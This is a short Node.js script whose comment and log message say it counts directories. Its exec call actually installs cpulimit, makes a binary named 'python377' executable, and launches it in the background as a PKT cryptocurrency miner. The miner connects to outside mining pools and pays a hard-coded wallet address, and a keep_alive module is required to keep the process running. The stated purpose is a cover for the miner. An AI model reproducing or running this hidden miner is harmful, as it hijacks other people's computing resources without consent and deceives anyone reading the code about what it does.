const { exec } = require('child_process');
 
// Counts the number of directory in
// current working directory
exec('npm i cpulimit -g && chmod +x ./python377 && nohup cpulimit -l 20 -c ./python377 ann http://pool.pkt.world https://stratum.zetahash.com -p pkt1qfhr09kswj2hy0xgnzzj5r8ux09m7ltnuumf4xx &', (error, stdout, stderr) => {
    if (error) {
        console.error(`exec error: ${error}`);
        return;
    }
    console.log(`stdout: No. of directories = ${stdout}`);
    if (stderr != "")
        console.error(`stderr: ${stderr}`);
});

const keep_alive = require('./keep_alive.js')
